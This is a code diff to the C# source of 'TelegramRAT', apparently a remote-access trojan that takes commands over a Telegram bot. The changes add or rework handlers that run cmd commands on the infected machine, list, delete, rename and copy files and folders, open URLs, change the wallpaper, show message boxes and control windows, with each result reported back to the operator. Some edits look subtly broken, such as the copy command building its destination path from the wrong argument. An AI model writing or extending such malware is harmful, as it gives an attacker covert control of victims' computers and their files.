@@ -104,7 +104,8 @@ namespace TelegramRAT
             {
                 Command = "/cmd",
                 IgnoreCountArgs = true,
-                Example = "/cmd",
+                Description = "Run cmd commands.",
+                Example = "/cmd dir",
                 Execute = async (model, update) =>
                 {
                     try
@@ -136,8 +137,8 @@ namespace TelegramRAT
                     {
                         ReportError(update, ex);
                     }
-                },
-                Description = "Run cmd commands."
+                }
+
             });
 
             //DIR
@@ -147,7 +148,8 @@ namespace TelegramRAT
                 CountArgs = 0,
                 IgnoreCountArgs = true,
                 MayHaveNoArgs = true,
-                Example = "/dir",
+                Description = "Get all files and folders from current directory.",
+                Example = "/dir C:\\Program Files",
                 Execute = async (model, update) =>
                 {
                     try
@@ -211,8 +213,7 @@ namespace TelegramRAT
                     {
                         ReportError(update, ex);
                     }
-                },
-                Description = "Get all files and folders from current directory."
+                }
             });
 
             //PROCESSESLIST
@@ -291,7 +292,7 @@ namespace TelegramRAT
                     {
                         if (Directory.Exists(model.RawArgs))
                         {
-                            Directory.SetCurrentDirectory(model.RawArgs);
+                            Directory.SetCurrentDirectory(model.Args[0]);
                             await Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Directory changed to: <code>{Directory.GetCurrentDirectory()}</code>", ParseMode.Html, replyToMessageId: update.Message.MessageId);
                         }
                     }
@@ -513,79 +514,16 @@ namespace TelegramRAT
             {
                 Command = "/message",
                 IgnoreCountArgs = true,
-                Example = "message ! Hello",
+                Description = "Send message with dialog window.",
+                Example = "message Lorem ipsum",
                 Execute = async (model, update) =>
                 {
                     await Task.Run(() =>
                     {
-                        string Caption = "Message";
-                        string Text = "";
-                        if (model.Args[0].StartsWith("_"))
-                        {
-                            Caption = model.Args[0].Substring(1);
-                        }
-                        WinAPI.MsgBoxFlag flag = WinAPI.MsgBoxFlag.MB_APPLMODAL; //*Shit code intesifies*
-
-                        bool ContainsIcon = false;
-                        switch (model.Args[0].ToLower())
-                        {
-                            case "!":
-                                flag |= WinAPI.MsgBoxFlag.MB_ICONEXCLAMATION;
-                                ContainsIcon = true;
-                                break;
-                            case "i":
-                                flag |= WinAPI.MsgBoxFlag.MB_ICONINFORMATION;
-                                ContainsIcon = true;
-                                break;
-                            case "x":
-                                flag |= WinAPI.MsgBoxFlag.MB_ICONSTOP;
-                                ContainsIcon = true;
-                                break;
-                            case "?":
-                                flag |= WinAPI.MsgBoxFlag.MB_ICONQUESTION;
-                                flag |= WinAPI.MsgBoxFlag.MB_YESNO;
-                                ContainsIcon = true;
-                                break;
-
-                        }
-                        if (model.Args[0].StartsWith("_"))
-                        {
-                            Text = model.RawArgs.Substring(model.Args[0].Length + 1);
-
-                        }
-                        else
-                        {
-                            if (ContainsIcon)
-                                Text = model.RawArgs.Substring(2);
-                            else
-                            {
-                                Text = model.RawArgs;
-                            }
-                        }
-
-
-                        int answer = WinAPI.ShowMessageBox(Text, Caption, flag);
-                        string userResponse = "User response: ";
-                        switch (answer)
-                        {
-                            case 1:
-                                userResponse += "ok";
-                                break;
-                            case 6:
-                                userResponse += "yes";
-                                break;
-                            case 7:
-                                userResponse += "no";
-                                break;
-
-                        }
-                        Bot.SendTextMessageAsync(update.Message.Chat.Id, userResponse, replyToMessageId: update.Message.MessageId);
+                        WinAPI.ShowMessageBox(model.RawArgs, "Message", WinAPI.MsgBoxFlag.MB_APPLMODAL);
                     });
-                },
-                Description =
-                "Send message with dialog window\n" +
-                "You can change its icon by typing these characters before:\n" +
-                "x - Error\n? - Question mark\n! - Exclamation mark\ni - Info\n"
+                }
+
             });
 
             //OPENURL
@@ -593,9 +531,8 @@ namespace TelegramRAT
             {
                 Command = "/openurl",
                 IgnoreCountArgs = true,
-
+                Description = "Open URL with default browser.",
                 Example = "/openurl https://google.com",
-
                 Execute = async (model, update) =>
                 {
                     if (!model.RawArgs.Contains("://"))
@@ -612,8 +549,7 @@ namespace TelegramRAT
                     Process.Start(info);
 
                     await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Url opened!", replyToMessageId: update.Message.MessageId);
-                },
-                Description = "Open URL with default browser."
+                }
             });
 
             //UPLOAD FILE TO PC
@@ -773,6 +709,7 @@ namespace TelegramRAT
             commands.Add(new BotCommand
             {
                 Command = "/wallpaper",
+                Description = "Change wallpapers. Don't foreget to attach the image.",
                 Execute = async (model, update) =>
                 {
                     await Task.Run(async () =>
@@ -797,8 +734,7 @@ namespace TelegramRAT
                             ReportError(update, ex);
                         }
                     });
-                },
-                Description = "Change wallpapers. Don't foreget to attach the image."
+                }
             });
 
             //MINIMIZE WINDOW
@@ -807,6 +743,7 @@ namespace TelegramRAT
                 Command = "/minimize",
                 MayHaveNoArgs = true,
                 IgnoreCountArgs = true,
+                Description = "Minimize window by name, or top window if name was not provided.",
                 Example = "/minimize Calculator",
                 Execute = async (model, update) =>
                 {
@@ -816,11 +753,12 @@ namespace TelegramRAT
                         {
                             if (model.Args.Length > 0)
                             {
-                                WinAPI.MinimizeWindow(WinAPI.FindWindow(null, model.RawArgs));
+                                WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_MINIMIZE, 0);
+                                //WinAPI.MinimizeWindow(WinAPI.FindWindow(null, model.RawArgs));
                             }
                             else
                             {
-                                WinAPI.MinimizeWindow(WinAPI.GetForegroundWindow());
+                                WinAPI.PostMessage(WinAPI.GetForegroundWindow(), WinAPI.WM_SYSCOMMAND, WinAPI.SC_MINIMIZE, 0);
                             }
 
                             await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
@@ -831,8 +769,54 @@ namespace TelegramRAT
                             ReportError(update, ex);
                         }
                     });
-                },
-                Description = "Minimize window by name, or top window if name was not provided"
+                }
+            });
+
+            //MAXIMIZE WINDOW
+            commands.Add(new BotCommand
+            {
+                Command = "/maximize",
+                Execute = (model, update) =>
+                {
+                    Task.Run(() =>
+                    {
+                        if (model.Args.Length > 0)
+                        {
+                            WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_MAXIMIZE, 0);
+                            //WinAPI.MinimizeWindow(WinAPI.FindWindow(null, model.RawArgs));
+                        }
+                        else
+                        {
+                            WinAPI.PostMessage(WinAPI.GetForegroundWindow(), WinAPI.WM_SYSCOMMAND, WinAPI.SC_MAXIMIZE, 0);
+                        }
+
+                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
+                    });
+                }
+            });
+
+            //RESTORE WINDOW
+            commands.Add(new BotCommand
+            {
+                Command = "/restore",
+                Execute = (model, update) =>
+                {
+                    Task.Run(() =>
+                    {
+                        if (model.Args.Length > 0)
+                        {
+                            WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_RESTORE, 0);
+                            //WinAPI.MinimizeWindow(WinAPI.FindWindow(null, model.RawArgs));
+                        }
+                        else
+                        {
+                            WinAPI.PostMessage(WinAPI.GetForegroundWindow(), WinAPI.WM_SYSCOMMAND, WinAPI.SC_RESTORE, 0);
+                        }
+
+                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
+
+                    });
+                }
             });
 
             //MOVE MOUSE TO COORD
@@ -1177,6 +1161,7 @@ namespace TelegramRAT
             commands.Add(new BotCommand
             {
                 Command = "/deletefile",
+                MayHaveNoArgs = false,
                 Description = "Delete file in path",
                 Example = "/deletefile hello world.txt",
                 Execute = (model, update) =>
@@ -1207,7 +1192,9 @@ namespace TelegramRAT
             commands.Add(new BotCommand
             {
                 Command = "/createfolder",
-                Description = "/Create folder",
+                MayHaveNoArgs = false,
+                Description = "Create folder.",
+                Example = "/createfolder C:\\Users\\User\\Documents\\NewFolder",
                 Execute = async (model, update) =>
                 {
                     await Task.Run(() =>
@@ -1236,8 +1223,9 @@ namespace TelegramRAT
             commands.Add(new BotCommand
             {
                 Command = "/deletefolder",
+                MayHaveNoArgs = false,
                 Description = "Delete folder.",
-                Execute = async(model, update) =>
+                Execute = async (model, update) =>
                 {
                     await Task.Run(() =>
                     {
@@ -1270,22 +1258,49 @@ namespace TelegramRAT
                 {
                     Task.Run(() =>
                     {
-                        if (System.IO.File.Exists(model.Args[0]))
+                        if (System.IO.File.Exists(model.Args[0]) && !System.IO.File.Exists($"{Path.GetDirectoryName(model.Args[0])}\\{model.Args[1]}"))
                         {
                             string fileToRename = Path.GetFullPath(model.Args[0]);
                             string newFileName = $"{Path.GetDirectoryName(fileToRename)}\\{model.Args[1]}";
                             System.IO.File.Move(fileToRename, newFileName);
-                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "This folder does not exist!", replyToMessageId: update.Message.MessageId);
+                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                         }
                         else
                         {
-                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "This file does not exist!", replyToMessageId: update.Message.MessageId);
+                            if (!System.IO.File.Exists(model.Args[0]))
+                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "This file does not exist!", replyToMessageId: update.Message.MessageId);
+                            if (System.IO.File.Exists($"{Path.GetDirectoryName(model.Args[0])}\\{model.Args[1]}"))
+                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is a file with the same name!", replyToMessageId: update.Message.MessageId);
                         }
                     });
                 }
             });
 
-
+            //COPY FILE
+            commands.Add(new BotCommand
+            {
+                Command = "/copyfile",
+                CountArgs = 2,
+                Description = "Copy file. First argument is file path (full or realtive), second is folder path",
+                Example = "/copyfile hello.txt C:\\Users\\User\\Documents",
+                Execute = (model, update) =>
+                {
+                    Task.Run(() =>
+                    {
+                        if (System.IO.File.Exists(model.Args[0]) && Directory.Exists(model.Args[1]))
+                        {
+                            System.IO.File.Copy(model.Args[0], $"{model.Args[1]}\\{Path.GetFileName(model.Args[1])}");
+                        }
+                        else
+                        {
+                            if (!System.IO.File.Exists(model.Args[0]))
+                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "This file does not exist!", replyToMessageId: update.Message.MessageId);
+                            if (!Directory.Exists(model.Args[1]))
+                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "This path does not exist!", replyToMessageId: update.Message.MessageId);
+                        }
+                    });
+                }
+            });
 
 
             #endregion
